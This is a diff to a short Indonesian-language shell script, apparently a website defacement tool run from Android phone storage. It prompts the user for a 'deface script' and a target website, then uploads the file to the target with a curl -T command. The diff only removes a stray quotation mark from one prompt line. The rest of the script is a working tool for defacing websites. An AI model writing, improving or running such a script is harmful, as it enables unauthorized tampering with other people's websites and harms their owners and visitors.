@@ -15,5 +15,5 @@ echo $cyan "__________________________"
 echo $green "Masukan Script Deface Anda"
 read -p "M4uL@localhost : " Anda
 echo $green "Masukan Target Web"
-read -p "M4uL@localhost : " Web"
+read -p "M4uL@localhost : " Web
 curl -T /storage/emulated/0/$Anda $Web
